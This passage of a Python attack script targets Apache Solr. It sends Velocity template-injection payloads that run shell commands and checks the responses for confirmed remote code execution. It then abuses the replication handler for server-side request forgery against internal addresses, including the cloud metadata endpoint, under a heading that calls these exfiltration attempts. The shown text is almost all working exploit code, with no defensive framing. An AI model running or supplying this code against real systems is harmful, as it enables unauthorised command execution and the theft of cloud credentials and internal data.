ader(new java.io.InputStreamReader($i)))#set($l=$o.readLine())CMD_OUT:$l',\n}\n\nfor name, payload in payloads.items():\n    r = requests.post(f\"{SOLR}/{CORE}/select\", data={\n        \"q\": \"*:*\",\n        \"wt\": \"velocity\",\n        \"v.template\": \"custom\",\n        \"v.template.custom\": payload\n    }, timeout=10)\n    \n    # Search for command output in response\n    text = r.text\n    if \"CMD_OUT:\" in text:\n        idx = text.index(\"CMD_OUT:\")\n        output = text[idx:idx+200]\n        print(f\"\\n[{name}] HTTP {r.status_code}\")\n        print(f\"  {output}\")\n    elif \"uid=\" in text:\n        idx = text.index(\"uid=\")\n        print(f\"\\n[{name}] ✅ RCE CONFIRMED!\")\n        print(f\"  {text[max(0,idx-20):idx+100]}\")\n    elif \"Exit:\" in text:\n        idx = text.index(\"Exit:\")\n        print(f\"\\n[{name}] HTTP {r.status_code}\")\n        print(f\"  {text[idx:idx+200]}\")\n    else:\n        # Print the relevant portion\n        print(f\"\\n[{name}] HTTP {r.status_code}, response snippet:\")\n        # Find the velocity-rendered content (after the header)\n        if '\"docs\"' in text:\n            idx = text.index('\"docs\"')\n            print(f\"  ...{text[idx:idx+300]}\")\n        else:\n            print(f\"  {text[:500]}\")\n\n# ===== Try SSRF to exfiltrate internal data =====\nprint(\"\\n\" + \"=\" * 60)\nprint(\"SSRF EXFILTRATION ATTEMPTS\")\nprint(\"=\" * 60)\n\n# SSRF via ReplicationHandler to hit internal services\nssrf_targets = [\n    \"http://127.0.0.1:8983/solr/admin/info/system\",  # self\n    \"http://169.254.169.254/latest/meta-data/\",  # cloud metadata\n    \"http://172.17.0.1:22222/\",  # SSH service from container\n]\n\nfor target in ssrf_targets:\n    url = f\"{SOLR}/{CORE}/replication?command=fetchindex&masterUrl={target}\"\n    try:\n        r = requests.get(url, timeout=5)\n        resp = json.loads(r.text) if r.text.startswith('{') else {}\n        print(f\"\\n  SSRF → {target}\")\n        print(f\"   